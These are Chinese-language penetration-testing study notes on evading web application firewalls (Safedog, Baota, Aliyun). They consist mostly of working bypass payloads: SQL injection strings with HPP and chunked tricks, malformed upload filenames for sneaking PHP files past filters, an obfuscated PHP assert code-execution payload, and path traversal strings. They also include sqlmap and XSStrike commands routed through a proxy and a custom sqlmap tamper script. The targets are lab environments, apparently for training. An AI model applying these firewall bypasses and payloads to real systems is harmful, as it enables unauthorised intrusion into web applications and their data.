```
#知识点：

1、SQL注入&文件上传绕过
2、XSS跨站&其他漏洞绕过
3、HPP污染&垃圾数据&分块等

\#参考点：

\#将MySQL注入函数分为几类
拆分字符串函数：mid、left、lpad等
编码函数：ord、hex、ascii等
运算函数：+ - *  / & ^ ! like rlike reg等
空格替换部分：09、0a、0b、0c、0d等
关键数据函数：user()、version()、database()等
然后将这些不同类型的函数组合拼接在一起



\#上传参数名解析：明确哪些东西能修改？

Content-Disposition：一般可更改
name：表单参数值，不能更改
filename：文件名，可以更改
Content-Type：文件MIME，视情况更改



\#XSS跨站
利用XSStrike绕过 加上--timeout或--proxy配合代理池绕过cc&Fuzz



\#其他集合

RCE：
加密加码绕过？算法可逆？关键字绕过？提交方法？各种测试！
txt=$y=str_replace('x','','pxhpxinxfo()');assert($y);&submit=%E6%8F%90%E4%BA%A4
文件包含：没什么好说的就这几种
..\  ..../ ..\.\等
```

<img src="图片\ssssss.png" alt="ssssss"  />

<img src="图片\0 (4).png" alt="0 (4)"  />

<img src="图片\-Tcu7_wDteVVAZXvo13Erw.png" alt="-Tcu7_wDteVVAZXvo13Erw"  />

```
#安全狗-SQL注入&文件上传-知识点

SQL注入 https://www.cnblogs.com/cute-puli/p/11146625.html
关键字替换
http://192.168.0.100:8081/sqlilabs/Less-2/?id=1 like 1
http://192.168.0.100:8081/sqlilabs/Less-2/?id=1 like 12
更换提交方式：
POST id=-1 union select 1,2,3--+
模拟文件上传 传递数据
分块传输：更改数据请求格式 
https://github.com/c0ny1/chunked-coding-converter
HPP参数污染：id=1/**&id=-1%20union%20select%201,2,3%23*/

文件上传：换行解析&垃圾溢出&%00干扰&=符号干扰&参数模拟
filename=a.php
filename="a.php
filename="a.php%00"
垃圾数据;filename="a.php"
无限filename;filename="a.php"
filename=="a.php"
filename="name='uploadfile.php"
filename="Content-Disposition: form-data.php"
filename=="a.ph
p"

#安全狗-文件包含&代码执行-知识点
#BT&Aliyun-SQL注入&文件上传-知识点
python sqlmap.py -u "http://test.xiaodi8.com/pikachu/vul/sqli/sqli_str.php?name=*&submit=%E6%9F%A5%E8%AF%A2" --random-agent --tamper=rdog.py --proxy="http://tps118.kdlapi.com:15818"
格式替换

#BT&Aliyun-文件包含&代码执行-知识点
https://github.com/s0md3v/XSStrike
python xsstrike.py -u "http://test.xiaodi8.com/pikachu/vul/xss/xss_reflected_get.php?message=1&submit=submit" --proxy
txt=$y=str_replace('x','','pxhpxinxfo()');assert($y);&submit=%E6%8F%90%E4%BA%A4
文件包含：没什么好说的就这几种
..\  ..../ ..\.\等

安全狗：
注入 xss 文件上传拦截
rce 文件包含 等其他不拦截

宝塔：
注入 上传拦截
rce 文件包含 xss等其他不拦截
其中拦截的是关键字

aliyun
拦截的CC速度 和 后门 信息收集和权限维持阶段拦截
漏洞利用 他不拦截 默认的版本（升级版本没测试）

WAF PHP环境 JAVA不支持
```



rdog.py

```python
#!/usr/bin/env python2

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/*Eor*/"
                continue

            retVal += payload[i]

    return retVal
```



[干货 | 最全的文件上传漏洞之WAF拦截绕过总结-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1944142)
